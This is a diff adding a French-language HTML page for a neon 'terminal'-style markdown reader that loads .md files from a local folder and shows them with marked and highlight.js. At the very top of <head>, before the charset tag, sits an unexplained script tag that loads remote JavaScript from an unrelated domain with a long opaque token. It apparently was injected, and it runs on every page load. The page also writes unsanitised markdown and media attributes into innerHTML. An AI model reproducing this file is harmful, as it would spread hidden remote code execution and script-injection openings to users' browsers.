@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head><script type='text/javascript' src='https://dl.ouaisfi.eu/PwkV-EJtDz8u40h2J8AVHLXKS0-LKen5rhArJWd0BuoezP9N13vil8oyqTpvwVITaYscobW9AQjJ6SLbpU6IoBSQkX9QvYMrS4rI1xsP4NOnA7e8HakS8AwHQhLbehib8bFC-ww-Knpjy1JjH-fUcvW-FzehSptg76IZnlUy-0VFfwz6yv7WBw_3n3zhaglKTeTIK7piA9W3vbgs_aDNL4R76wWscXn3A7QR19vscUkDhbDhQwM3kLjNexUVRyJ13CSJh188nsJeD6xcCmFM0OeQgRMYRTLgzUe5hYtp2uhdmDbTSYCqcFsvk3Zm9_rbK57cklHPuFlx8n1tgoH-KBE-zzimk4fu5x1cargs3e5fI1-dUl6boPa3jAvVOSzgd7dNX5ve-GwufhEY3uLJH2iu2xh5K0TJWgoYVzqV_YfijvveIGtBhYzP3gpaZi3Mt8nHzSdfFhvQSbnI7u7SOJXRtMoGcmrRJdbtkWvtUFN6Og'></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Terminal Markdown Reader</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/11.1.1/marked.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/tokyo-night-dark.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --green-tender: #7fdbca;
+            --green-bright: #39ff14;
+            --green-neon: #00ff88;
+            --green-dim: #4a9b84;
+            --lilac: #c9b3ff;
+            --lilac-bright: #e0d4ff;
+            --lilac-dim: #9575cd;
+            --purple: #b19cd9;
+            --bg-dark: #0a0e0f;
+            --bg-darker: #050708;
+            --glass-bg: rgba(10, 14, 15, 0.85);
+            --text-light: #e0e0e0;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            33% { transform: translate(-2px, 1px); }
+            66% { transform: translate(2px, -1px); }
+        }
+
+        @keyframes glow-pulse {
+            0%, 100% { 
+                filter: drop-shadow(0 0 5px var(--green-neon)) drop-shadow(0 0 10px var(--green-neon)); 
+            }
+            50% { 
+                filter: drop-shadow(0 0 10px var(--green-bright)) drop-shadow(0 0 20px var(--green-neon)) drop-shadow(0 0 30px var(--green-neon)); 
+            }
+        }
+
+        @keyframes neon-flicker {
+            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+                text-shadow: 
+                    0 0 5px var(--green-neon),
+                    0 0 10px var(--green-neon),
+                    0 0 20px var(--green-neon),
+                    0 0 40px var(--green-neon);
+            }
+            20%, 24%, 55% {
+                text-shadow: 
+                    0 0 5px var(--green-neon);
+            }
+        }
+
+        @keyframes border-glow {
+            0%, 100% {
+                box-shadow: 
+                    0 0 10px var(--green-tender),
+                    0 0 20px var(--green-tender),
+                    0 0 30px var(--green-neon),
+                    inset 0 0 10px rgba(127, 219, 202, 0.1);
+            }
+            50% {
+                box-shadow: 
+                    0 0 15px var(--green-bright),
+                    0 0 30px var(--green-tender),
+                    0 0 45px var(--green-neon),
+                    0 0 60px var(--green-neon),
+                    inset 0 0 20px rgba(127, 219, 202, 0.2);
+            }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes lilac-glow {
+            0%, 100% {
+                box-shadow: 
+                    0 0 10px var(--lilac),
+                    0 0 20px var(--lilac),
+                    inset 0 0 10px rgba(201, 179, 255, 0.1);
+            }
+            50% {
+                box-shadow: 
+                    0 0 15px var(--lilac-bright),
+                    0 0 30px var(--lilac),
+                    0 0 45px var(--purple),
+                    inset 0 0 20px rgba(201, 179, 255, 0.2);
+            }
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: var(--bg-darker);
+            color: var(--text-light);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--green-neon), transparent);
+            animation: scanline 8s linear infinite;
+            opacity: 0.3;
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(127, 219, 202, 0.03) 0px,
+                transparent 1px,
+                transparent 2px,
+                rgba(127, 219, 202, 0.03) 3px
+            );
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1rem;
+            width: 100%;
+        }
+
+        header {
+            text-align: center;
+            padding: 2rem 1rem;
+            border-bottom: 2px solid var(--green-tender);
+            margin-bottom: 2rem;
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            position: relative;
+            animation: border-glow 3s ease-in-out infinite;
+        }
+
+        h1 {
+            font-size: clamp(1.5rem, 5vw, 3rem);
+            text-transform: uppercase;
+            letter-spacing: 0.3em;
+            color: var(--green-tender);
+            animation: glow-pulse 3s ease-in-out infinite, neon-flicker 8s linear infinite;
+            text-shadow: 
+                0 0 10px var(--green-neon), 
+                0 0 20px var(--green-neon),
+                0 0 30px var(--green-neon);
+            position: relative;
+        }
+
+        h1:hover {
+            animation: glitch 0.3s ease-in-out, glow-pulse 3s ease-in-out infinite, neon-flicker 8s linear infinite;
+        }
+
+        .subtitle {
+            color: var(--lilac);
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            letter-spacing: 0.2em;
+            text-shadow: 0 0 5px var(--lilac), 0 0 10px var(--lilac);
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+            width: 100%;
+            max-width: 100%;
+        }
+
+        @media (min-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr 350px;
+            }
+        }
+
+        .document-section {
+            background: rgba(10, 14, 15, 0.9);
+            border: 2px solid var(--green-tender);
+            border-radius: 8px;
+            padding: 2rem;
+            backdrop-filter: blur(10px);
+            min-height: 500px;
+            width: 100%;
+            max-width: 100%;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            box-shadow: 
+                0 0 30px rgba(127, 219, 202, 0.3),
+                inset 0 0 30px rgba(127, 219, 202, 0.05);
+        }
+
+        .sidebar {
+            background: var(--glass-bg);
+            border: 2px solid var(--lilac);
+            border-radius: 8px;
+            padding: 1rem;
+            backdrop-filter: blur(10px);
+            max-height: 80vh;
+            overflow-y: auto;
+            position: sticky;
+            top: 1rem;
+            width: 100%;
+            max-width: 100%;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            animation: lilac-glow 4s ease-in-out infinite;
+        }
+
+        .sidebar-title {
+            font-size: 1.3rem;
+            margin-bottom: 1rem;
+            color: var(--lilac-bright);
+            text-shadow: 0 0 8px var(--lilac), 0 0 15px var(--lilac);
+            border-bottom: 1px solid var(--lilac);
+            padding-bottom: 0.5rem;
+        }
+
+        .config-section {
+            background: rgba(127, 219, 202, 0.1);
+            border: 1px solid var(--green-tender);
+            border-radius: 4px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .config-label {
+            color: var(--green-tender);
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+            display: block;
+            text-shadow: 0 0 5px var(--green-neon);
+        }
+
+        .config-info {
+            font-size: 0.85rem;
+            color: var(--lilac-dim);
+            margin-top: 0.3rem;
+        }
+
+        .file-item {
+            padding: 0.8rem;
+            margin-bottom: 0.5rem;
+            border: 1px solid var(--green-dim);
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: rgba(10, 14, 15, 0.5);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .file-item:hover {
+            border-color: var(--green-tender);
+            background: rgba(127, 219, 202, 0.2);
+            transform: translateX(5px);
+            box-shadow: 
+                0 0 20px var(--green-neon),
+                0 0 30px var(--green-neon),
+                inset 0 0 10px rgba(127, 219, 202, 0.2);
+        }
+
+        .file-item.active {
+            border-color: var(--lilac);
+            background: rgba(201, 179, 255, 0.2);
+            box-shadow: 
+                0 0 25px var(--lilac),
+                0 0 40px var(--lilac),
+                inset 0 0 15px rgba(201, 179, 255, 0.2);
+        }
+
+        .file-icon {
+            font-size: 1.2rem;
+        }
+
+        .file-name {
+            color: var(--green-tender);
+            font-weight: bold;
+            flex: 1;
+            word-break: break-word;
+        }
+
+        .file-item.active .file-name {
+            color: var(--lilac-bright);
+        }
+
+        #markdownContent {
+            line-height: 1.8;
+            color: var(--text-light);
+        }
+
+        #markdownContent h1,
+        #markdownContent h2,
+        #markdownContent h3,
+        #markdownContent h4,
+        #markdownContent h5,
+        #markdownContent h6 {
+            color: var(--green-tender);
+            margin: 2rem 0 1rem;
+            text-shadow: 0 0 10px var(--green-neon);
+            border-bottom: 2px solid var(--green-tender);
+            padding-bottom: 0.5rem;
+        }
+
+        #markdownContent h1 { font-size: 2.5rem; }
+        #markdownContent h2 { font-size: 2rem; }
+        #markdownContent h3 { font-size: 1.6rem; }
+
+        #markdownContent p {
+            margin: 1rem 0;
+        }
+
+        #markdownContent a {
+            color: var(--lilac);
+            text-decoration: none;
+            border-bottom: 1px solid var(--lilac);
+            transition: all 0.3s ease;
+        }
+
+        #markdownContent a:hover {
+            color: var(--lilac-bright);
+            border-bottom-color: var(--lilac-bright);
+            text-shadow: 0 0 8px var(--lilac);
+        }
+
+        #markdownContent code {
+            background: rgba(127, 219, 202, 0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 3px;
+            color: var(--green-bright);
+            font-size: 0.9em;
+            border: 1px solid var(--green-tender);
+        }
+
+        #markdownContent pre {
+            background: #0d1117;
+            border: 2px solid var(--lilac);
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            box-shadow: 
+                0 0 30px rgba(201, 179, 255, 0.4),
+                inset 0 0 20px rgba(201, 179, 255, 0.1);
+        }
+
+        #markdownContent pre code {
+            background: none;
+            border: none;
+            padding: 0;
+            color: var(--green-tender);
+        }
+
+        #markdownContent blockquote {
+            border-left: 4px solid var(--lilac);
+            padding-left: 1.5rem;
+            margin: 1.5rem 0;
+            color: var(--lilac-dim);
+            font-style: italic;
+            background: rgba(201, 179, 255, 0.05);
+            padding: 1rem 1.5rem;
+            border-radius: 0 8px 8px 0;
+        }
+
+        #markdownContent ul, #markdownContent ol {
+            margin: 1rem 0 1rem 2rem;
+        }
+
+        #markdownContent li {
+            margin: 0.5rem 0;
+        }
+
+        #markdownContent img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid var(--green-tender);
+            margin: 1.5rem 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(127, 219, 202, 0.3);
+        }
+
+        #markdownContent img:hover {
+            transform: scale(1.02);
+            box-shadow: 
+                0 0 30px var(--green-neon),
+                0 0 50px var(--green-neon);
+        }
+
+        #markdownContent video {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid var(--lilac);
+            margin: 1.5rem 0;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(201, 179, 255, 0.3);
+        }
+
+        #markdownContent video:hover {
+            box-shadow: 
+                0 0 30px var(--lilac),
+                0 0 50px var(--lilac);
+        }
+
+        #markdownContent table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            border: 2px solid var(--green-tender);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        #markdownContent th {
+            background: var(--green-tender);
+            color: var(--bg-darker);
+            padding: 1rem;
+            text-align: left;
+            font-weight: bold;
+        }
+
+        #markdownContent td {
+            padding: 0.8rem 1rem;
+            border-bottom: 1px solid var(--green-dim);
+        }
+
+        #markdownContent tr:hover {
+            background: rgba(127, 219, 202, 0.1);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            position: relative;
+            max-width: 95%;
+            max-height: 95%;
+            background: var(--bg-dark);
+            border: 3px solid var(--green-bright);
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 
+                0 0 50px var(--green-neon),
+                0 0 100px var(--green-neon);
+            animation: modalSlideIn 0.4s ease;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                transform: scale(0.9) translateY(-20px);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: var(--lilac);
+            border: none;
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 2rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px var(--lilac);
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-close:hover {
+            background: var(--lilac-bright);
+            transform: rotate(90deg) scale(1.1);
+            box-shadow: 
+                0 0 30px var(--lilac-bright),
+                0 0 50px var(--lilac);
+        }
+
+        .modal-image {
+            max-width: 100%;
+            max-height: 90vh;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .modal-video {
+            max-width: 95vw;
+            max-height: 85vh;
+            display: block;
+        }
+
+        .modal-pdf {
+            width: 90vw;
+            height: 85vh;
+            border: none;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 4rem 2rem;
+            color: var(--green-tender);
+        }
+
+        .empty-state-icon {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .empty-state-title {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--green-bright);
+            text-shadow: 0 0 10px var(--green-neon);
+        }
+
+        .empty-state-text {
+            color: var(--lilac);
+            opacity: 0.9;
+        }
+
+        .error-message {
+            background: rgba(255, 100, 100, 0.1);
+            border: 2px solid #ff6464;
+            border-radius: 8px;
+            padding: 1rem;
+            color: #ff8888;
+            margin: 1rem 0;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(10, 14, 15, 0.5);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--green-tender);
+            border-radius: 4px;
+            box-shadow: 0 0 5px var(--green-neon);
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--green-bright);
+            box-shadow: 0 0 10px var(--green-bright);
+        }
+
+        @media (max-width: 767px) {
+            .document-section {
+                padding: 1rem;
+            }
+
+            #markdownContent h1 { font-size: 1.8rem; }
+            #markdownContent h2 { font-size: 1.5rem; }
+            #markdownContent h3 { font-size: 1.3rem; }
+
+            .modal-content {
+                max-width: 98%;
+                max-height: 98%;
+            }
+
+            .modal-close {
+                width: 40px;
+                height: 40px;
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>◉ MD Reader</h1>
+            <div class="subtitle">[ markdown.terminal.system ]</div>
+        </header>
+
+        <div class="main-content">
+            <div class="document-section">
+                <div id="markdownContent">
+                    <div class="empty-state">
+                        <div class="empty-state-icon">📄</div>
+                        <div class="empty-state-title">Configuration requise</div>
+                        <div class="empty-state-text">
+                            Créez un dossier "markdown" au même niveau que ce fichier HTML<br>
+                            et ajoutez-y vos fichiers .md
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sidebar">
+                <h3 class="sidebar-title">⟩ Configuration</h3>
+                
+                <div class="config-section">
+                    <label class="config-label">📁 Dossier source</label>
+                    <div style="font-family: monospace; background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 4px; word-break: break-all; color: var(--green-tender);">
+                        ./markdown/
+                    </div>
+                    <div class="config-info">
+                        Les fichiers .md de ce dossier seront automatiquement chargés
+                    </div>
+                </div>
+
+                <h3 class="sidebar-title" style="margin-top: 1.5rem;">⟩ Documents</h3>
+                <div id="fileList"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal" class="modal">
+        <button class="modal-close" onclick="closeModal()">×</button>
+        <div class="modal-content">
+            <div id="modalBody"></div>
+        </div>
+    </div>
+
+    <script>
+        const MARKDOWN_FOLDER = './markdown/';
+        
+        const markdownFiles = [
+            'readme.md',
+            'documentation.md',
+            'guide.md',
+            'notes.md',
+            'warning.md',
+            'avertissement.md'
+        ];
+
+        let currentFileIndex = -1;
+        let loadedFiles = [];
+
+        marked.setOptions({
+            highlight: function(code, lang) {
+                if (lang && hljs.getLanguage(lang)) {
+                    try {
+                        return hljs.highlight(code, { language: lang }).value;
+                    } catch (err) {}
+                }
+                return hljs.highlightAuto(code).value;
+            },
+            breaks: true,
+            gfm: true
+        });
+
+        const fileList = document.getElementById('fileList');
+        const markdownContent = document.getElementById('markdownContent');
+        const modal = document.getElementById('modal');
+        const modalBody = document.getElementById('modalBody');
+
+        async function loadMarkdownFiles() {
+            const promises = markdownFiles.map(async (filename) => {
+                try {
+                    const response = await fetch(MARKDOWN_FOLDER + filename);
+                    if (response.ok) {
+                        const content = await response.text();
+                        return {
+                            name: filename,
+                            content: content,
+                            loaded: true
+                        };
+                    }
+                } catch (error) {
+                    console.log(`Impossible de charger ${filename}:`, error);
+                }
+                return null;
+            });
+
+            const results = await Promise.all(promises);
+            loadedFiles = results.filter(f => f !== null);
+
+            if (loadedFiles.length === 0) {
+                showNoFilesMessage();
+            } else {
+                updateFileList();
+                loadDocument(0);
+            }
+        }
+
+        function showNoFilesMessage() {
+            markdownContent.innerHTML = `
+                <div class="error-message">
+                    <h3>⚠ Aucun fichier trouvé</h3>
+                    <p>Créez un dossier <strong>"markdown"</strong> au même niveau que ce fichier HTML et ajoutez-y vos fichiers .md</p>
+                    <p style="margin-top: 1rem; font-size: 0.9em;">Fichiers recherchés :</p>
+                    <ul style="margin-left: 2rem; margin-top: 0.5rem;">
+                        ${markdownFiles.map(f => `<li>${f}</li>`).join('')}
+                    </ul>
+                    <p style="margin-top: 1rem; font-size: 0.85em; opacity: 0.8;">
+                        Vous pouvez modifier la liste des fichiers dans la variable <code>markdownFiles</code> du script.
+                    </p>
+                </div>
+            `;
+            
+            fileList.innerHTML = '<div style="padding: 1rem; text-align: center; color: var(--lilac-dim);">Aucun fichier disponible</div>';
+        }
+
+        function updateFileList() {
+            fileList.innerHTML = loadedFiles.map((file, index) => `
+                <div class="file-item ${index === currentFileIndex ? 'active' : ''}" onclick="loadDocument(${index})">
+                    <span class="file-icon">📝</span>
+                    <span class="file-name">${file.name}</span>
+                </div>
+            `).join('');
+        }
+
+        function loadDocument(index) {
+            currentFileIndex = index;
+            const file = loadedFiles[index];
+            
+            const html = marked.parse(file.content);
+            markdownContent.innerHTML = html;
+            
+            updateFileList();
+            
+            document.querySelectorAll('#markdownContent img').forEach(img => {
+                img.addEventListener('click', () => {
+                    openImageModal(resolveMediaPath(img.src), img.alt);
+                });
+            });
+            
+            document.querySelectorAll('#markdownContent video').forEach(video => {
+                video.addEventListener('click', () => {
+                    openVideoModal(resolveMediaPath(video.src));
+                });
+            });
+            
+            document.querySelectorAll('#markdownContent a').forEach(link => {
+                const href = link.getAttribute('href');
+                if (href) {
+                    if (href.match(/\.(pdf)$/i)) {
+                        link.addEventListener('click', (e) => {
+                            e.preventDefault();
+                            openPdfModal(resolveMediaPath(href));
+                        });
+                    } else if (href.match(/\.(jpg|jpeg|png|gif|webp|svg)$/i)) {
+                        link.addEventListener('click', (e) => {
+                            e.preventDefault();
+                            openImageModal(resolveMediaPath(href), link.textContent);
+                        });
+                    } else if (href.match(/\.(mp4|webm|ogg)$/i)) {
+                        link.addEventListener('click', (e) => {
+                            e.preventDefault();
+                            openVideoModal(resolveMediaPath(href));
+                        });
+                    }
+                }
+            });
+
+            markdownContent.scrollTop = 0;
+        }
+
+        function resolveMediaPath(path) {
+            if (path.startsWith('http://') || path.startsWith('https://') || path.startsWith('data:')) {
+                return path;
+            }
+            
+            if (path.startsWith('./')) {
+                return MARKDOWN_FOLDER + path.substring(2);
+            }
+            
+            if (!path.startsWith('/')) {
+                return MARKDOWN_FOLDER + path;
+            }
+            
+            return path;
+        }
+
+        function openImageModal(src, alt) {
+            modalBody.innerHTML = `<img src="${src}" alt="${alt || ''}" class="modal-image">`;
+            modal.classList.add('active');
+        }
+
+        function openVideoModal(src) {
+            modalBody.innerHTML = `
+                <video class="modal-video" controls autoplay>
+                    <source src="${src}">
+                    Votre navigateur ne supporte pas la lecture de vidéos.
+                </video>
+            `;
+            modal.classList.add('active');
+        }
+
+        function openPdfModal(src) {
+            modalBody.innerHTML = `<iframe src="${src}" class="modal-pdf"></iframe>`;
+            modal.classList.add('active');
+        }
+
+        function closeModal() {
+            modal.classList.remove('active');
+            const video = modalBody.querySelector('video');
+            if (video) {
+                video.pause();
+            }
+            modalBody.innerHTML = '';
+        }
+
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                closeModal();
+            }
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeModal();
+            }
+        });
+
+        loadMarkdownFiles();
+    </script>
+</body>
+</html>
